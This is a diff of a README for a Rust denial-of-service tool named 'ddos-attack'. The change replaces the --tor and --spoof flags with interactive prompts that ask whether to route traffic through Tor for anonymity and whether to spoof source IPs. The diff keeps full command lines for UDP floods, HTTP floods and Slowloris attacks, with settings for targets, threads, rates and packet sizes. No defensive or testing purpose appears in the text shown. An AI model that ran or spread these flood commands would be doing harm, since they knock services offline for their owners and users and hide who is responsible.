@@ -74,6 +74,9 @@ cargo build --release
 
 ## How to Use
 
+### Interactive Experience
+The tool now automatically asks you about Tor usage and IP spoofing when you run attacks - no need for complex command-line flags!
+
 ### Basic Usage Pattern
 ```bash
 ./target/release/ddos-attack [ATTACK_TYPE] [OPTIONS]
@@ -90,6 +93,9 @@ cargo build --release
   --threads 50 \
   --rate 1000 \
   --size 1024
+
+# The tool will ask:
+# 🔒 Do you want to use Tor for anonymity? (y/N): 
 ```
 
 #### UDP Flood Attack
@@ -101,17 +107,10 @@ cargo build --release
   --threads 100 \
   --rate 2000 \
   --size 512
-```
 
-#### UDP Flood with IP Spoofing (Requires Root)
-```bash
-sudo ./target/release/ddos-attack layer4 \
-  --targets "192.168.1.100" \
-  --ports "53" \
-  --protocol udp \
-  --threads 200 \
-  --rate 5000 \
-  --spoof
+# The tool will ask:
+# 🔒 Do you want to use Tor for anonymity? (y/N): 
+# 🎭 Do you want to enable IP spoofing? (requires root) (y/N): 
 ```
 
 ### 2. Layer 7 Attacks (HTTP/HTTPS)
@@ -124,20 +123,9 @@ sudo ./target/release/ddos-attack layer4 \
   --rate 100 \
   --method GET \
   --user-agent "Mozilla/5.0 Custom Agent"
-```
 
-#### HTTP Flood via Tor (Anonymous)
-```bash
-# First start Tor
-./target/release/ddos-attack tor --start
-
-# Then run the attack
-./target/release/ddos-attack layer7 \
-  --targets "https://example.com" \
-  --threads 25 \
-  --rate 50 \
-  --method GET \
-  --tor
+# The tool will ask:
+# 🔒 Do you want to use Tor for anonymity? (y/N): 
 ```
 
 #### Slowloris Attack
@@ -146,6 +134,9 @@ sudo ./target/release/ddos-attack layer4 \
   --targets "https://example.com" \
   --threads 300 \
   --slowloris
+
+# The tool will ask:
+# 🔒 Do you want to use Tor for anonymity? (y/N): 
 ```
 
 ### 3. Tor Management
@@ -194,8 +185,10 @@ sudo ./examples/udp_spoof.sh
 - `--threads`: Number of concurrent threads (default: 100)
 - `--size`: Packet size in bytes (default: 1024)
 - `--rate`: Packets per second (default: 1000)
-- `--spoof`: Enable IP spoofing (requires root)
-- `--tor`: Route through Tor network
+
+**Interactive prompts will ask about:**
+- Tor usage for anonymity
+- IP spoofing (UDP only, requires root)
 
 ### Layer 7 Options:
 - `--targets`: Target URLs (comma-separated)
@@ -203,8 +196,10 @@ sudo ./examples/udp_spoof.sh
 - `--rate`: Requests per second (default: 100)
 - `--method`: HTTP method (`GET`, `POST`, `PUT`, `DELETE`)
 - `--user-agent`: Custom User-Agent string
-- `--tor`: Route through Tor network
 - `--slowloris`: Enable Slowloris attack mode
+
+**Interactive prompts will ask about:**
+- Tor usage for anonymity
 
 ## Security Notes
 
